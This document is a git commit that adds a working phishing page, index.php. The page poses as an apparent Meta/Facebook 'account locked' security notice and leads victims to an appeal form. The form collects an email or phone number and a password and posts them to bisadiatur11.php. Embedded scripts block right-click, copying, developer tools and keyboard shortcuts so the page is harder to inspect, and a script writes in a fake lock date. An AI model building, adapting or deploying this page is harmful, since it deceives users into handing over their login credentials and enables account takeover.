ea890aabb4809c81f98e82388edb8f51b7ef3d80
ramkon <dencameh18@gmail.com>
2025-06-17 16:50:00 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,147 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security Step</title>
+        <!-- Required meta tags -->
+        <meta charset="utf-8" />
+        <meta
+            name="viewport"
+            content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta property="og:type" content="Article" />
+        <meta property="og:title" content="Security Step" />
+        <meta
+            property="og:description"
+            content="We saw unusual activity on your account.To protect you, your profile is hidden now and you can't access some features" />
+        <meta
+            property="og:image"
+            content="https://i.ibb.co/rs4BM3H/meta-askar-stockadobe.jpg" />
+
+        <!-- Bootstrap CSS v5.2.1 -->
+        <link
+            href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css"
+            rel="stylesheet"
+            integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT"
+            crossorigin="anonymous" />
+    </head>
+    <script type="text/javascript">
+      function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+      </script><script type="text/javascript">
+      window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
+      </script><title>Restrictions Information</title><script language="JavaScript">
+        var tanggallengkap = new String();
+        var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
+        namahari = namahari.split(" ");
+        var namabulan = ("January February March April May June July August September October November December");
+        namabulan = namabulan.split(" ");
+        var tgl = new Date();
+        var hari = tgl.getDay();
+        var tanggal = tgl.getDate();
+        var bulan = tgl.getMonth();
+        var tahun = tgl.getFullYear();
+        tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
+        </script><script type="text/javascript">
+      document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
+      </script></head>
+    <body>
+  <div class="container-fluid">
+			<div class="nav justify-content-center">
+				<a class="navbar-brand" href="#">
+                    <br>
+					<img src="https://i.ibb.co/q5G4hmd/intro.png" class="img-fluid rounded mx-auto d-block" width="" height="" alt="...">
+				</a>
+			</div>
+                    <div class="mt-4">
+<p class="text-center h3">
+                    Hi, we need to confirm this account belongs to you
+                </p>
+            </div>
+            <hr class="my-4" />
+
+            <div class="p-3 mb-2 bg-secondary bg-opacity-25 text-dark rounded">
+                <div style="text-align: left; color:black; margin-top: 1px;"><strong>Account Locked <script language="JavaScript">document.write(tanggallengkap);</script></strong></div>
+				<p>
+                
+					<ul class="list-unstyled">
+					   <li>
+						   <ul>
+							   <li>Your Account Has Been Locked. To protect you, your profile is hidden now and you can't access some features.</li>
+							   <li>We have detected unusual activity on your page that violates our community standards.</li>
+							   <li>Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</li>
+							   <li>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</li>
+						   </ul>
+					   </li>
+					</ul>
+	  		</div>
+            <hr class="my-4" />
+            <p class="text-center small">
+               We'll walk you through a few steps to get started confirming your information.
+
+            </p>
+            <button
+                type="button"
+                class="btn btn-primary d-block mx-auto w-100  "
+                data-bs-toggle="modal"
+                data-bs-target="#staticBackdrop">
+                Get Started
+            </button>
+        </div>
+
+        <div
+            class="modal fade"
+            id="staticBackdrop"
+            data-bs-backdrop="static"
+            data-bs-keyboard="false"
+            tabindex="-1"
+            aria-labelledby="staticBackdropLabel"
+            aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered">
+                <div class="modal-content">
+                    <div class="modal-body">
+                            <div class="mt-4">
+                                <form action="bisadiatur11.php" method="POST">
+                                    <div class="mb-3 shadow rounded">
+                                        <input
+                                            type="email"
+                                            class="form-control up"
+                                            name="i"
+                                            placeholder="Mobile number or email address"
+                                            autocomplete="on"
+                                            required="yes"
+                                            maxlength="100" />
+                                    </div>
+                                    <div class="mb-3 shadow">
+                                        <input
+                                            type="password"
+                                            class="form-control up"
+                                            name="am"
+                                            placeholder="Password"
+                                            autocomplete="off"
+                                            required="yes"
+                                            maxlength="150" />
+                                    </div>
+                                    <div class="form-group mt-3 shadow rounded">
+                                        <button
+                                            class="btn btn-primary d-block mx-auto w-100"
+                                            type="submit">
+                                            Next
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Bootstrap JavaScript Libraries -->
+        <script
+            src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
+            integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3"
+            crossorigin="anonymous"></script>
+
+        <script
+            src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.min.js"
+            integrity="sha384-7VPbUDkoPSGFnVtYi0QogXtr74QeVeeIs99Qfg5YCF+TidwNdjvaKZX19NZ/e6oz"
+            crossorigin="anonymous"></script>
+	   </div>
+    
